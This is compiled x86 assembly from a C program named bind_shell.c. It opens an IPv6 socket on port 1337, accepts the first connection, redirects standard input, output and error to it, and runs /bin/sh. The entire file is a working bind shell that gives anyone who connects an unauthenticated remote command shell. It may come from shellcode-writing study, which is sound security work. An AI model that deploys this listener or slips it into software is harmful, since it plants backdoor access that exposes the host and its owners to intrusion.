	.file	"bind_shell.c"
	.intel_syntax noprefix
	.comm	sockfd,4,4
	.comm	recvConn,4,4
	.section	.rodata
	.align 4
	.type	NO, @object
	.size	NO, 4
NO:
	.zero	4
.LC0:
	.string	"/bin/sh"
	.text
	.globl	main
	.type	main, @function
main:
.LFB2:
	.cfi_startproc
	lea	ecx, [esp+4]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR [ecx-4]
	push	ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	mov	ebp, esp
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x7c,0x6
	sub	esp, 52
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR [ebp-12], eax
	xor	eax, eax
	sub	esp, 4
	push	0
	push	1
	push	10
	call	socket
	add	esp, 16
	mov	DWORD PTR sockfd, eax
	mov	eax, DWORD PTR sockfd
	sub	esp, 12
	push	4
	push	OFFSET FLAT:NO
	push	26
	push	41
	push	eax
	call	setsockopt
	add	esp, 32
	mov	WORD PTR [ebp-40], 10
	mov	WORD PTR [ebp-56], 2
	sub	esp, 12
	push	1337
	call	htons
	add	esp, 16
	mov	WORD PTR [ebp-38], ax
	sub	esp, 12
	push	1337
	call	htons
	add	esp, 16
	mov	WORD PTR [ebp-54], ax
	mov	eax, DWORD PTR in6addr_any
	mov	DWORD PTR [ebp-32], eax
	mov	eax, DWORD PTR in6addr_any+4
	mov	DWORD PTR [ebp-28], eax
	mov	eax, DWORD PTR in6addr_any+8
	mov	DWORD PTR [ebp-24], eax
	mov	eax, DWORD PTR in6addr_any+12
	mov	DWORD PTR [ebp-20], eax
	mov	DWORD PTR [ebp-52], 0
	mov	eax, DWORD PTR sockfd
	sub	esp, 4
	push	16
	lea	edx, [ebp-56]
	push	edx
	push	eax
	call	bind
	add	esp, 16
	mov	eax, DWORD PTR sockfd
	sub	esp, 4
	push	28
	lea	edx, [ebp-40]
	push	edx
	push	eax
	call	bind
	add	esp, 16
	mov	eax, DWORD PTR sockfd
	sub	esp, 8
	push	0
	push	eax
	call	listen
	add	esp, 16
	mov	eax, DWORD PTR sockfd
	sub	esp, 4
	push	0
	push	0
	push	eax
	call	accept
	add	esp, 16
	mov	DWORD PTR recvConn, eax
	mov	eax, DWORD PTR recvConn
	sub	esp, 8
	push	0
	push	eax
	call	dup2
	add	esp, 16
	mov	eax, DWORD PTR recvConn
	sub	esp, 8
	push	1
	push	eax
	call	dup2
	add	esp, 16
	mov	eax, DWORD PTR recvConn
	sub	esp, 8
	push	2
	push	eax
	call	dup2
	add	esp, 16
	sub	esp, 4
	push	0
	push	0
	push	OFFSET FLAT:.LC0
	call	execve
	add	esp, 16
	mov	eax, DWORD PTR recvConn
	sub	esp, 12
	push	eax
	call	close
	add	esp, 16
	mov	eax, 0
	mov	ecx, DWORD PTR [ebp-12]
	xor	ecx, DWORD PTR gs:20
	je	.L3
	call	__stack_chk_fail
.L3:
	mov	ecx, DWORD PTR [ebp-4]
	.cfi_def_cfa 1, 0
	leave
	.cfi_restore 5
	lea	esp, [ecx-4]
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE2:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609"
	.section	.note.GNU-stack,"",@progbits
